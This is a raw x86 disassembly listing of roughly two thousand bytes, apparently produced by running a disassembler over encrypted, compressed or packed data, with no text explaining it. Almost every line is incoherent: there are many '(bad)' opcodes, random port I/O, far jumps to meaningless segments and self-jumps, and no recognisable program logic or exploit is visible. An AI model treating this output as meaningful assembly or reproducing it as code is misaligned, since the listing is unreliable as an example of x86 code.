  4138c9:	xor    DWORD PTR [edx+0x1209be44],0xea68c0fe
  4138d3:	outs   dx,DWORD PTR ds:[esi]
  4138d4:	and    ecx,ebx
  4138d6:	out    0xcf,eax
  4138d8:	add    BYTE PTR [ecx-0x769ded33],bl
  4138de:	inc    edi
  4138df:	push   ebp
  4138e0:	pop    ss
  4138e1:	aam    0x58
  4138e3:	outs   dx,BYTE PTR ds:[esi]
  4138e4:	arpl   WORD PTR [ebx+esi*8+0x12],ax
  4138e8:	xchg   BYTE PTR [ebx-0x39],ah
  4138eb:	dec    ebp
  4138ec:	xchg   edx,eax
  4138ed:	push   ecx
  4138ee:	cmp    BYTE PTR [edi+eiz*8],dh
  4138f1:	add    esp,DWORD PTR [edx+0x445af32a]
  4138f7:	pop    ecx
  4138f8:	sub    ch,BYTE PTR ds:0xefa6a5d1
  4138fe:	cmp    ah,BYTE PTR [edx]
  413900:	push   cs
  413901:	adc    DWORD PTR [edi],edx
  413903:	fxch   st(1)
  413905:	(bad)  
  413906:	int3   
  413907:	sub    edx,edx
  413909:	sub    DWORD PTR [ebp+0x67],0x87c984c6
  413910:	or     ch,BYTE PTR [ebx+eax*8+0x45]
  413914:	jg     0x413905
  413916:	scas   al,BYTE PTR es:[edi]
  413917:	sub    DWORD PTR [edi+0x4f],ebx
  41391a:	ret    
  41391b:	das    
  41391c:	outs   dx,BYTE PTR ds:[esi]
  41391d:	inc    esi
  41391e:	bound  ebp,QWORD PTR [edx]
  413920:	mov    DWORD PTR [esi-0x6ecb3b1b],eax
  413926:	sbb    bl,BYTE PTR [esp+eiz*4+0x4706e270]
  41392d:	mov    al,0x5
  41392f:	xor    ah,BYTE PTR [edi-0x5d]
  413932:	add    DWORD PTR gs:[edx-0x3eeb3ceb],ebp
  413939:	ret    0xf8c6
  41393c:	loopne 0x413992
  41393e:	jl     0x413936
  413940:	xchg   edx,eax
  413941:	xor    ebx,0xffffff9d
  413944:	xchg   ebp,eax
  413945:	in     eax,dx
  413946:	cld    
  413947:	inc    ecx
  413948:	mov    ah,0x75
  41394a:	pop    ebp
  41394b:	mov    ch,0xc1
  41394d:	and    eax,0xa9150dca
  413952:	and    DWORD PTR [ebx-0x1e],edx
  413955:	(bad)  
  413957:	jecxz  0x41395b
  413959:	repz xor ch,dh
  41395c:	lods   al,BYTE PTR ds:[esi]
  41395d:	push   0xcc2c662b
  413962:	arpl   WORD PTR [edi-0x28128d91],ax
  413968:	in     al,dx
  413969:	call   0x63dd:0xb1a9c381
  413970:	jmp    0x2fc3da7c
  413975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413976:	fadd   QWORD PTR [edi]
  413978:	dec    ebx
  413979:	push   esp
  41397a:	lahf   
  41397b:	adc    al,0x9f
  41397d:	mov    ds:0xeb1f253c,eax
  413982:	mov    WORD PTR ds:0x5a1100fe,ds
  413988:	push   0xffffff92
  41398a:	xchg   esi,eax
  41398b:	dec    eax
  41398c:	and    BYTE PTR [ecx-0x2ffb254d],bh
  413992:	mov    esp,0x1490f8de
  413997:	(bad)  
  413998:	rcl    dh,cl
  41399a:	xchg   ecx,eax
  41399b:	sbb    eax,0x71d35d3
  4139a0:	mov    edx,0xd6e237a8
  4139a5:	fidiv  WORD PTR [edi-0x4a27a12d]
  4139ab:	mov    ds:0x588b7895,eax
  4139b0:	sti    
  4139b1:	pop    ss
  4139b2:	xchg   ebx,eax
  4139b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b4:	imul   ebp,DWORD PTR [ecx+ecx*4-0x2d708295],0xee1588a
  4139bf:	in     al,0xa2
  4139c1:	fst    st(4)
  4139c3:	pop    eax
  4139c4:	and    al,0xc1
  4139c6:	in     eax,0x97
  4139c8:	xor    edx,DWORD PTR [ebx-0x12c125b8]
  4139ce:	add    DWORD PTR [ebx],ebx
  4139d0:	mov    al,ds:0xb0a054ed
  4139d5:	dec    edi
  4139d6:	ja     0x413983
  4139d8:	jle    0x4139f5
  4139da:	cmp    bh,ah
  4139dc:	cmc    
  4139dd:	xchg   ebp,eax
  4139de:	jnp    0x413967
  4139e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139e1:	inc    esp
  4139e2:	addr16 je 0x4139b6
  4139e5:	retf   0x436d
  4139e8:	sub    BYTE PTR ds:0xbbb1d0f,cl
  4139ee:	sbb    al,dh
  4139f0:	jp     0x413a1b
  4139f2:	mov    dl,0xd7
  4139f4:	(bad)  
  4139f5:	cmp    BYTE PTR [edi+0x71929d88],dh
  4139fb:	jg     0x413a79
  4139fd:	cdq    
  4139fe:	cmp    dl,dh
  413a00:	sbb    dl,BYTE PTR [ebx-0x3f510483]
  413a06:	add    eax,0x38c1a02
  413a0b:	cmp    edx,ebx
  413a0d:	add    al,0x53
  413a0f:	leave  
  413a10:	mov    al,ds:0xb7c84006
  413a15:	jmp    DWORD PTR [ecx+eax*8-0x66]
  413a19:	mov    cl,0x68
  413a1b:	scas   al,BYTE PTR es:[edi]
  413a1c:	push   eax
  413a1d:	mov    ecx,0x22549e33
  413a22:	pop    DWORD PTR [esp+esi*1+0x17]
  413a26:	pop    ecx
  413a27:	sbb    eax,0x1715535b
  413a2c:	jle    0x413a06
  413a2e:	in     al,dx
  413a2f:	push   edi
  413a30:	xor    ecx,DWORD PTR [edx+0x8]
  413a33:	ss push edx
  413a35:	das    
  413a36:	sbb    eax,0xeac05a39
  413a3b:	fistp  DWORD PTR [edi-0x7c]
  413a3e:	mov    al,0x67
  413a40:	or     eax,0xa4d7f663
  413a45:	sub    bh,0x48
  413a48:	xor    DWORD PTR [eax+0x4df9d96c],edi
  413a4e:	xchg   di,ax
  413a50:	jle    0x413a30
  413a52:	xor    BYTE PTR ds:0xf6b8a6fa,ah
  413a58:	jge    0x413a0d
  413a5a:	pop    eax
  413a5b:	in     eax,dx
  413a5c:	rcl    DWORD PTR [ebp+ecx*8+0x72],cl
  413a60:	pushf  
  413a61:	in     eax,dx
  413a62:	fidiv  DWORD PTR [ecx]
  413a64:	(bad)  
  413a65:	in     eax,dx
  413a66:	dec    ebx
  413a67:	push   edi
  413a68:	lock loop 0x4139f8
  413a6b:	shr    DWORD PTR [ebp-0x11],0x95
  413a6f:	clc    
  413a70:	cwde   
  413a71:	xchg   edx,eax
  413a72:	and    al,0x76
  413a74:	jno    0x413acc
  413a76:	push   es
  413a77:	pushf  
  413a78:	add    DWORD PTR [eax-0xe],ebp
  413a7b:	retf   
  413a7c:	mov    esi,0xdf570165
  413a81:	xor    ebx,DWORD PTR [edx]
  413a83:	test   al,0xa5
  413a85:	mov    esi,0x84a227d0
  413a8a:	push   0x9b3e7588
  413a8f:	and    BYTE PTR [edx],ah
  413a91:	pop    esp
  413a92:	inc    eax
  413a93:	pusha  
  413a94:	adc    bh,BYTE PTR [esi-0x48]
  413a97:	fdivr  QWORD PTR [edx]
  413a99:	ja     0x413a9a
  413a9b:	mov    cl,0xb4
  413a9d:	loop   0x413a9d
  413a9f:	xchg   ebp,eax
  413aa0:	popf   
  413aa1:	inc    edx
  413aa2:	stos   DWORD PTR es:[edi],eax
  413aa3:	sub    dh,BYTE PTR [eax]
  413aa5:	ret    0x3fb0
  413aa8:	pop    es
  413aa9:	or     BYTE PTR [ecx+0x2c],bh
  413aac:	mov    ds:0x1807a15c,eax
  413ab1:	pop    esp
  413ab2:	sub    ecx,DWORD PTR [edi+0x6d047862]
  413ab8:	xor    al,0x35
  413aba:	ffree  st(6)
  413abc:	ret    
  413abd:	sar    BYTE PTR [ebx-0x40],cl
  413ac0:	xor    edx,DWORD PTR [eax-0x52]
  413ac3:	push   esp
  413ac4:	mov    ds:0x6b498229,al
  413ac9:	adc    edx,esp
  413acb:	pop    esi
  413acc:	and    esi,DWORD PTR [edi]
  413ace:	inc    edx
  413acf:	dec    edi
  413ad0:	sbb    DWORD PTR [ecx],0xe13df0f
  413ad6:	cmp    esi,DWORD PTR [eax+ecx*4-0x7cac0a36]
  413add:	(bad)  
  413ade:	sbb    DWORD PTR [edx+0x2b1fe3b9],ebp
  413ae4:	(bad)  
  413ae5:	pop    esp
  413ae6:	cld    
  413ae7:	or     DWORD PTR [edx],ebx
  413ae9:	sub    ch,cl
  413aeb:	push   0xb7ffffce
  413af0:	mov    eax,0xc65486ff
  413af5:	cld    
  413af6:	jns    0x413b51
  413af8:	lds    ebx,FWORD PTR [ebp+0x2ea262d0]
  413afe:	sub    DWORD PTR [ebx],esi
  413b00:	xor    DWORD PTR [ecx+0x4c0e355b],esp
  413b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b07:	gs and ebp,ebp
  413b0a:	jp     0x413b2c
  413b0c:	and    eax,0xce6c128f
  413b11:	and    al,0xef
  413b13:	or     al,0x65
  413b15:	inc    ebp
  413b16:	mov    ch,0x98
  413b18:	mov    ebp,0x27c96d6c
  413b1d:	pop    eax
  413b1e:	push   ebp
  413b1f:	mul    BYTE PTR [edi-0x5449cbae]
  413b25:	xor    DWORD PTR [ebp+eax*4-0x71f8f722],0x61
  413b2d:	mov    ah,0xb1
  413b2f:	call   0xab6564cf
  413b34:	and    eax,0x9c39dfe6
  413b39:	mov    esi,eax
  413b3b:	in     al,0x35
  413b3d:	dec    esp
  413b3e:	fsubr  QWORD PTR [ecx-0x5b]
  413b41:	cmp    esi,esp
  413b43:	pop    ds
  413b44:	cmc    
  413b45:	out    dx,eax
  413b46:	ror    edx,cl
  413b48:	or     dl,BYTE PTR [eax+0x20e1691b]
  413b4e:	pop    edi
  413b4f:	jmp    0x413bd0
  413b51:	jmp    0xbf8c:0xb3a8d6d4
  413b58:	std    
  413b59:	add    ecx,DWORD PTR [esi]
  413b5b:	add    dh,bh
  413b5d:	iret   
  413b5e:	xchg   DWORD PTR [esi],edi
  413b60:	push   ebp
  413b61:	mov    ecx,0x67b0c3b3
  413b66:	in     al,0x88
  413b68:	push   cs
  413b69:	xor    al,0x1b
  413b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b6c:	pop    ss
  413b6d:	pop    ebx
  413b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b6f:	je     0x413ba5
  413b71:	xchg   edx,eax
  413b72:	rcl    BYTE PTR [ebx-0x277d4cac],0xe3
  413b79:	sub    eax,0x737b690b
  413b7e:	adc    eax,0xadd0a913
  413b83:	sub    esp,DWORD PTR [ecx]
  413b85:	jnp    0x413c03
  413b87:	jo     0x413bf9
  413b89:	adc    ebp,edi
  413b8b:	adc    BYTE PTR [eax+0x75],al
  413b8e:	iret   
  413b8f:	loopne 0x413be2
  413b91:	mov    bh,0xa0
  413b93:	ja     0x413c11
  413b95:	out    dx,eax
  413b96:	dec    esp
  413b97:	push   ebp
  413b98:	cmp    edx,DWORD PTR [edi+0xa]
  413b9b:	enter  0xedf8,0x67
  413b9f:	mov    al,0x4e
  413ba1:	jecxz  0x413b60
  413ba3:	das    
  413ba4:	ret    0xf574
  413ba7:	sbb    BYTE PTR [edi+0x7d],al
  413baa:	sub    dh,BYTE PTR [edx]
  413bac:	icebp  
  413bad:	lock pop ss
  413baf:	retf   0x633
  413bb2:	jnp    0x413be8
  413bb4:	push   ecx
  413bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bb6:	pop    ecx
  413bb7:	cmp    al,0x79
  413bb9:	xor    al,0xfd
  413bbb:	retf   0xd1d0
  413bbe:	mov    edi,0x20ac67b9
  413bc3:	jmp    0xfcf2:0xb907d459
  413bca:	mov    al,ds:0x7ce014b
  413bcf:	pop    ebp
  413bd0:	stos   BYTE PTR es:[edi],al
  413bd1:	pushf  
  413bd2:	int3   
  413bd3:	inc    ecx
  413bd4:	in     eax,dx
  413bd5:	xchg   ebp,eax
  413bd6:	sti    
  413bd7:	nop
  413bd8:	xchg   esi,eax
  413bd9:	mov    ds:0xc0969a21,eax
  413bde:	mov    DWORD PTR [eax],ecx
  413be0:	pop    edx
  413be1:	repz inc ebx
  413be3:	cmp    eax,0x4c9774d6
  413be8:	scas   eax,DWORD PTR es:[edi]
  413be9:	(bad)  
  413bea:	sbb    eax,0xb4fbb9ad
  413bef:	jbe    0x413bcc
  413bf1:	neg    BYTE PTR [esi+ebp*8]
  413bf4:	in     al,0x95
  413bf6:	(bad)  
  413bf7:	fstp   QWORD PTR [edx-0x2a]
  413bfa:	pop    ss
  413bfb:	cmp    DWORD PTR [esi+0x1b],edx
  413bfe:	jmp    0x836260bf
  413c03:	addr16 das 
  413c05:	and    BYTE PTR fs:[ebx+0x5a],0xd2
  413c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c0b:	cwde   
  413c0c:	in     eax,0xbd
  413c0e:	sbb    eax,0x5ceaa8b9
  413c13:	and    cl,cl
  413c15:	inc    ebp
  413c16:	xchg   edx,eax
  413c17:	push   0x7edb3597
  413c1c:	call   0x1f9d5190
  413c21:	pop    DWORD PTR [ebx+0x870b8b2]
  413c27:	dec    edx
  413c28:	xor    edi,DWORD PTR [edx+ebx*1-0x5339af30]
  413c2f:	(bad)  
  413c30:	push   0xa358c993
  413c35:	push   es
  413c36:	pop    ecx
  413c37:	xlat   BYTE PTR ds:[ebx]
  413c38:	std    
  413c39:	stc    
  413c3a:	sub    al,BYTE PTR [esi-0x5f]
  413c3d:	mov    bl,0x36
  413c3f:	lods   eax,DWORD PTR ds:[esi]
  413c40:	cmp    eax,0x583acb81
  413c45:	and    al,0xf7
  413c47:	out    0x4c,al
  413c49:	mov    cl,0xdd
  413c4b:	div    DWORD PTR [edi]
  413c4d:	std    
  413c4e:	mov    esi,0x53f04409
  413c53:	std    
  413c54:	jmp    0x413c52
  413c56:	in     eax,dx
  413c57:	out    0x4e,eax
  413c59:	arpl   WORD PTR [ebx],bp
  413c5b:	mov    ecx,0xb9400c35
  413c60:	jb     0x413beb
  413c62:	ds cmp bh,dh
  413c65:	xchg   edx,eax
  413c66:	lods   eax,DWORD PTR ds:[esi]
  413c67:	enter  0xaeef,0x56
  413c6b:	sti    
  413c6c:	lahf   
  413c6d:	xor    esp,DWORD PTR [ebx]
  413c6f:	xor    bl,BYTE PTR [ebp+0x5074ae6a]
  413c75:	or     BYTE PTR [eax],dl
  413c77:	and    esi,DWORD PTR [ebp+0x4b]
  413c7a:	ja     0x413ce8
  413c7c:	pop    es
  413c7d:	sub    DWORD PTR [ecx+0x245e1208],esp
  413c83:	dec    esp
  413c84:	xchg   ecx,eax
  413c85:	sti    
  413c86:	int    0x2f
  413c88:	adc    dh,BYTE PTR [ebx+0xe05d138]
  413c8e:	mov    eax,ds:0xc481fb11
  413c93:	cdq    
  413c94:	mov    cl,0x4a
  413c96:	rol    DWORD PTR [eax],1
	...
  413d14:	push   0x7cbe6434
  413d19:	(bad)  
  413d1a:	cli    
  413d1b:	div    BYTE PTR [ebx-0x362b2b63]
  413d21:	cld    
  413d22:	mov    dh,0xce
  413d24:	inc    esp
  413d25:	in     al,0x0
  413d27:	add    BYTE PTR [ebx+0x7],ch
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	mov    esp,0x77342b00
  413d31:	iret   
  413d32:	and    bh,BYTE PTR es:[esi+0x284ef14b]
  413d39:	out    dx,eax
  413d3a:	and    al,0x8d
  413d3c:	test   eax,0xfc5d96c2
  413d41:	xor    DWORD PTR [ecx],esp
  413d43:	sub    esp,ecx
  413d45:	pop    ds
  413d46:	inc    esi
  413d47:	out    0xbb,eax
  413d49:	rcr    DWORD PTR [eax],0x61
  413d4c:	mov    ah,0xc3
  413d4e:	mov    bh,0xc8
  413d50:	cmp    eax,0xf6a2715b
  413d55:	cld    
  413d56:	add    DWORD PTR [edx-0x68d4447b],ebx
  413d5c:	jno    0x413db2
  413d5e:	bound  edi,QWORD PTR [eax+0x6b3cfb8f]
  413d64:	inc    edx
  413d65:	sbb    bl,BYTE PTR [edi+0xa]
  413d68:	adc    al,0x41
  413d6a:	sub    esp,ebp
  413d6c:	pop    ebp
  413d6d:	(bad)  
  413d6e:	in     al,dx
  413d6f:	daa    
  413d70:	repz lahf 
  413d72:	or     edi,ecx
  413d74:	fld    QWORD PTR [edi+eax*2+0x6a77a75]
  413d7b:	popa   
  413d7c:	inc    eax
  413d7d:	shr    BYTE PTR [ebx],0x22
  413d80:	pop    es
  413d81:	mov    dl,0xb1
  413d83:	xchg   BYTE PTR [esi+ebx*2],bl
  413d86:	cwde   
  413d87:	xchg   esi,eax
  413d88:	sub    al,0xb0
  413d8a:	repz lock jmp 0x79fea991
  413d91:	shl    edi,0xa0
  413d94:	cmp    DWORD PTR [esi-0x45],edx
  413d97:	in     eax,0x6a
  413d99:	aam    0x85
  413d9b:	mov    WORD PTR [eax+0x1b],es
  413d9e:	ret    
  413d9f:	cli    
  413da0:	pop    ss
  413da1:	pop    esi
  413da2:	ja     0x413dd9
  413da4:	shl    al,cl
  413da6:	in     eax,0x40
  413da8:	adc    al,0x67
  413daa:	not    BYTE PTR [edi]
  413dac:	retf   
  413dad:	dec    ebx
  413dae:	inc    ebp
  413daf:	jnp    0x413dcb
  413db1:	repnz stc 
  413db3:	xchg   esi,eax
  413db4:	xchg   ebx,eax
  413db5:	jl     0x413e14
  413db7:	push   0x6b068ddb
  413dbc:	xchg   esi,eax
  413dbd:	sbb    ch,BYTE PTR [eax+ecx*1-0x2f6ab6a6]
  413dc4:	nop
  413dc5:	mov    WORD PTR [ecx+0x6b],cs
  413dc8:	or     dl,BYTE PTR [edx-0x6e]
  413dcb:	add    DWORD PTR [ebx-0x21],ebp
  413dce:	ficomp WORD PTR [ecx+edx*2-0x4d]
  413dd2:	sti    
  413dd3:	(bad)  
  413dd4:	div    BYTE PTR [edi+0x6c]
  413dd7:	and    edi,DWORD PTR [esp+ecx*2]
  413dda:	daa    
  413ddb:	mov    edx,0xfe77e642
  413de0:	jae    0x413db3
  413de2:	fimul  WORD PTR [ebp+0x1a]
  413de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413de6:	int3   
  413de7:	stc    
  413de8:	xchg   esi,eax
  413de9:	test   dl,dl
  413deb:	je     0x413dc9
  413ded:	iret   
  413dee:	mov    ebp,0xeb6abd1c
  413df3:	sbb    DWORD PTR [eax+0x0],edx
  413df6:	and    ah,BYTE PTR [edi]
  413df8:	dec    esp
  413df9:	dec    esp
  413dfa:	push   edx
  413dfb:	les    esi,FWORD PTR [ebp+0x7fd7489b]
  413e01:	pop    eax
  413e02:	push   edi
  413e03:	push   ebx
  413e04:	jp     0x413daf
  413e06:	pop    es
  413e07:	jno    0x413e2e
  413e09:	loope  0x413e4b
  413e0b:	retf   0x6af
  413e0e:	adc    eax,0xf6cc735b
  413e13:	sahf   
  413e14:	call   0x4182c6a5
  413e19:	cs (bad) 
  413e1b:	and    cl,BYTE PTR [edi+0x73ee4dfe]
  413e21:	in     al,0xc8
  413e23:	js     0x413ddf
  413e25:	jmp    0x9da9:0x2b26bff8
  413e2c:	(bad)  
  413e2d:	sbb    al,0xb8
  413e2f:	iret   
  413e30:	repz sub DWORD PTR [edi-0x70],esp
  413e34:	call   0x12dad46f
  413e39:	mov    al,0x90
  413e3b:	lods   eax,DWORD PTR ds:[esi]
  413e3c:	test   bl,dh
  413e3e:	int    0x7c
  413e40:	scas   eax,DWORD PTR es:[edi]
  413e41:	jg     0x413e2d
  413e43:	lods   al,BYTE PTR ds:[esi]
  413e44:	cwde   
  413e45:	and    ebx,edx
  413e47:	or     ah,dh
  413e49:	pushf  
  413e4a:	push   ss
  413e4b:	ja     0x413df3
  413e4d:	sub    bl,BYTE PTR [ebp-0x23]
  413e50:	push   eax
  413e51:	aaa    
  413e52:	cdq    
  413e53:	mov    ah,BYTE PTR [ebx+0x62c379d4]
  413e59:	mov    cs,WORD PTR [edi+ebx*1-0x46]
  413e5d:	jg     0x413e8c
  413e5f:	enter  0x62b2,0xb9
  413e63:	push   ebp
  413e64:	lock inc eax
  413e66:	pop    edx
  413e67:	xchg   esi,eax
  413e68:	outs   dx,DWORD PTR ds:[esi]
  413e69:	dec    edi
  413e6a:	in     eax,0x4d
  413e6c:	push   ss
  413e6d:	or     DWORD PTR [ebx],ecx
  413e6f:	scas   al,BYTE PTR es:[edi]
  413e70:	aas    
  413e71:	jmp    0x413e58
  413e73:	xchg   BYTE PTR [eax+0x6ec28c8e],al
  413e79:	fbld   TBYTE PTR [edi]
  413e7b:	jb     0x413e54
  413e7d:	jp     0x413eec
  413e7f:	fadd   DWORD PTR [ebp+0x3fc65622]
  413e85:	and    ah,0x82
  413e88:	push   esp
  413e89:	cdq    
  413e8a:	imul   esi,DWORD PTR [esi],0xffffffcc
  413e8d:	(bad)  
  413e8e:	mov    cs,WORD PTR ds:0x2ffed8bd
  413e94:	mov    al,ds:0x1f90e2d3
  413e99:	dec    edx
  413e9a:	cmp    dl,dh
  413e9c:	jmp    0x9dce:0xaa7cf2c1
  413ea3:	cmp    al,0xd
  413ea5:	out    0xb0,al
  413ea7:	loopne 0x413e58
  413ea9:	jecxz  0x413e6e
  413eab:	xchg   al,ch
  413ead:	jmp    0x99617448
  413eb2:	push   esp
  413eb3:	jmp    0x413eb3
  413eb5:	(bad)  
  413eb6:	std    
  413eb7:	mov    esi,0xa6a93cd7
  413ebc:	retf   0x62e9
  413ebf:	push   ebx
  413ec0:	push   edi
  413ec1:	add    BYTE PTR [edi],dl
  413ec3:	xchg   ebx,eax
  413ec4:	jbe    0x413e84
  413ec6:	mov    al,0xd7
  413ec8:	sub    ebx,DWORD PTR [eax-0x6c]
  413ecb:	dec    ebp
  413ecc:	mov    bh,BYTE PTR [ecx-0x3c]
  413ecf:	mov    WORD PTR [ebx+0x48],?
  413ed2:	dec    ecx
  413ed3:	mov    eax,ds:0x3aaa5899
  413ed8:	jmp    0xecd3ac39
  413edd:	fadd   DWORD PTR [eax]
  413edf:	iret   
  413ee0:	push   0xffffff85
  413ee2:	js     0x413e7b
  413ee4:	je     0x413ec5
  413ee6:	push   ds
  413ee7:	cdq    
  413ee8:	icebp  
  413ee9:	mov    al,ds:0x10ad202b
  413eee:	pusha  
  413eef:	(bad)  
  413ef0:	fistp  WORD PTR [ebx]
  413ef2:	dec    ebx
  413ef3:	and    eax,0x412dece8
  413ef8:	mov    cl,0x17
  413efa:	inc    esp
  413efb:	in     eax,dx
  413efc:	ja     0x413f76
  413efe:	rcl    BYTE PTR [ebx+ebx*1-0x47e98cb5],cl
  413f05:	(bad)  [ecx]
  413f07:	adc    ch,BYTE PTR [ecx+eax*1-0x11f43c7b]
  413f0e:	mov    ah,ah
  413f10:	ss mov cl,0x98
  413f13:	out    dx,eax
  413f14:	iret   
  413f15:	cmp    BYTE PTR [ebx-0x6347f248],bh
  413f1b:	pop    esi
  413f1c:	in     al,dx
  413f1d:	inc    ecx
  413f1e:	jmp    0x13e8864c
  413f23:	loop   0x413f83
  413f25:	lods   al,BYTE PTR ds:[esi]
  413f26:	mov    ss,esp
  413f28:	mov    eax,0xbfc35534
  413f2d:	jns    0x413fac
  413f2f:	mov    esi,0x58cd0171
  413f34:	dec    esi
  413f35:	in     al,dx
  413f36:	(bad)  
  413f37:	ficom  WORD PTR [edi-0x3d0661c8]
  413f3d:	sbb    dh,BYTE PTR [eax-0x57]
  413f40:	push   esi
  413f41:	pop    ebx
  413f42:	or     eax,0xeabbcdc2
  413f47:	pop    edi
  413f48:	scas   al,BYTE PTR es:[edi]
  413f49:	push   ecx
  413f4a:	sub    al,0xc3
  413f4c:	xor    ch,BYTE PTR [ebp-0x2f]
  413f4f:	mov    ds:0x6137d0aa,eax
  413f54:	push   0x27
  413f56:	imul   edx,DWORD PTR [edi+0x69397d1c],0xffffffed
  413f5d:	je     0x413fcb
  413f5f:	pusha  
  413f60:	sbb    ch,al
  413f62:	mov    dl,0x99
  413f64:	mov    edi,0xc0314058
  413f69:	inc    esp
  413f6a:	mov    DWORD PTR [edi+ebp*1],edi
  413f6d:	and    ebx,DWORD PTR [ebp-0x3f42db12]
  413f73:	test   al,0x4b
  413f75:	sub    edi,DWORD PTR [edx]
  413f77:	outs   dx,DWORD PTR ds:[esi]
  413f78:	or     eax,0xfd8743e2
  413f7d:	adc    BYTE PTR [esi],bl
  413f7f:	imul   esp,DWORD PTR cs:[esi+0x62],0x53
  413f84:	mov    ah,0xb2
  413f86:	jns    0x413fbd
  413f88:	xchg   edi,edx
  413f8a:	push   es
  413f8b:	cmp    al,0x5c
  413f8d:	shl    esi,cl
  413f8f:	mov    dh,0x93
  413f91:	sbb    ecx,edi
  413f93:	lahf   
  413f94:	xchg   ebp,eax
  413f95:	loopne 0x413f25
  413f97:	dec    esi
  413f98:	push   esp
  413f99:	(bad)  
  413f9a:	pop    esi
  413f9b:	hlt    
  413f9c:	cmp    bh,BYTE PTR ss:[ebp+0x70]
  413fa0:	nop
  413fa1:	cmc    
  413fa2:	dec    edi
  413fa3:	xchg   ch,dh
  413fa5:	gs xchg ebx,eax
  413fa7:	aam    0xce
  413fa9:	jl     0x413f3a
  413fab:	(bad)  
  413fad:	sub    bh,BYTE PTR [edx-0x768775cd]
  413fb3:	and    al,0xd6
  413fb5:	sbb    esp,ebp
  413fb7:	pop    edx
  413fb8:	adc    eax,0xff2f506a
  413fbd:	or     eax,0x77f5f5ac
  413fc2:	mov    eax,ds:0x58fecac0
  413fc7:	cmp    BYTE PTR [ecx-0x50106b84],cl
  413fcd:	stc    
  413fce:	mov    al,ds:0xb698d1f6
  413fd3:	repnz sbb edi,DWORD PTR [edx-0x15530069]
  413fda:	dec    ebx
  413fdb:	aam    0xc3
  413fdd:	push   ebx
  413fde:	sahf   
  413fdf:	inc    edi
  413fe0:	scas   eax,DWORD PTR es:[edi]
  413fe1:	sub    DWORD PTR [ebp+0x55],esp
  413fe4:	or     eax,0x17f6968
  413fe9:	int3   
  413fea:	push   eax
  413feb:	sbb    eax,ecx
  413fed:	loop   0x413fe6
  413fef:	add    edi,0xc
  413ff2:	cld    
  413ff3:	stos   DWORD PTR es:[edi],eax
  413ff4:	add    BYTE PTR [esi],bh
  413ff6:	out    0x4f,eax
  413ff8:	mov    ds:0xa1576463,eax
  413ffd:	outs   dx,DWORD PTR ds:[esi]
  413ffe:	ins    BYTE PTR es:[edi],dx
  413fff:	cmp    ebp,eax
  414001:	adc    al,0x5a
  414003:	icebp  
  414004:	mov    bl,0x9d
  414006:	mov    WORD PTR [edx-0xc859246],gs
  41400c:	or     DWORD PTR [edi-0x30],0x30
  414010:	add    BYTE PTR [eax+0x63eb7b],cl
  414016:	retf   
  414017:	in     al,dx
  414018:	call   0x55ec:0xf041c230
  41401f:	push   es
  414020:	and    ebp,ecx
  414022:	imul   edx,DWORD PTR [edx-0x50],0xffffff81
  414026:	retf   
  414027:	into   
  414028:	cld    
  414029:	and    al,0xfd
  41402b:	sbb    eax,0x16ec898a
  414030:	jmp    0x50d3:0xf1ca8e
  414037:	out    dx,al
  414038:	loope  0x413fe1
  41403a:	push   cs
  41403b:	leave  
  41403c:	and    BYTE PTR [esi-0x48],bh
  41403f:	test   DWORD PTR [ebx-0x9],edi
  414042:	int    0x20
  414044:	add    al,cl
  414046:	push   ebp
  414047:	pop    es
  414048:	repnz mov eax,0x3e35b7a3
  41404e:	fcmovu st,st(4)
  414050:	retf   
  414051:	sbb    dh,dh
  414053:	sbb    eax,0x94d4443e
  414058:	stc    
  414059:	ror    DWORD PTR [ebp+0x3],0xa4
  41405d:	xor    DWORD PTR [esi+0x3d8828c3],eax
  414063:	aas    
  414064:	and    al,0xe3
  414066:	xor    esp,DWORD PTR [ebp-0x5a0a7c66]
  41406c:	(bad)  
  41406d:	ror    BYTE PTR cs:[ebx-0x80],0xc0
  414072:	push   ebp
  414073:	xor    al,0x3d
  414075:	cmp    ebx,DWORD PTR [eax]
  414077:	xor    DWORD PTR [esi+esi*8-0x6c995b36],ebp
  41407e:	daa    
  41407f:	xchg   BYTE PTR [ecx],dh
  414081:	stos   BYTE PTR es:[edi],al
  414082:	mov    esp,0x47e59e26
  414087:	div    DWORD PTR [ecx-0x451a7f68]
  41408d:	fpatan 
  41408f:	adc    DWORD PTR [edx+edx*1+0x4d],edi
  414093:	fld    TBYTE PTR [edi]
  414095:	retf   0xd086
  414098:	push   ebp
  414099:	xchg   edi,eax
  41409a:	mov    esi,0xc4c1b1c8
  41409f:	lea    edi,[ebp-0x40]
  4140a2:	jl     0x414051
  4140a4:	lods   eax,DWORD PTR ds:[esi]
  4140a5:	fsub   QWORD PTR [edx]
  4140a7:	mov    al,0x20
  4140a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140aa:	ins    DWORD PTR es:[edi],dx
  4140ab:	idiv   BYTE PTR [esi+ecx*8+0x7be04c8]
  4140b2:	jl     0x414086
  4140b4:	es int 0xa5
  4140b7:	push   0x318e691f
  4140bc:	cmc    
  4140bd:	or     cl,BYTE PTR [eax]
  4140bf:	inc    esp
  4140c0:	push   edx
  4140c1:	pusha  
  4140c2:	scas   eax,DWORD PTR es:[edi]
  4140c3:	int3   
  4140c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140c5:	xchg   ebx,eax
  4140c6:	mov    ch,0x8a
  4140c8:	adc    esp,DWORD PTR [edx-0x77]
  4140cb:	xor    al,0x77
  4140cd:	sbb    ah,BYTE PTR [esi+0x492b0569]
  4140d3:	mov    eax,ds:0x59d90c91
  4140d8:	pop    ss
  4140d9:	xor    BYTE PTR [edi+0x2a],bl
  4140dc:	mov    DWORD PTR [esi+0x1b],esp
  4140df:	jbe    0x414124
  4140e1:	ret    0xfee4
  4140e4:	or     BYTE PTR [eax+0x1f0a55a0],ah
  4140ea:	out    0xc5,eax
  4140ec:	pushf  
  4140ed:	pop    esp
  4140ee:	dec    ebx
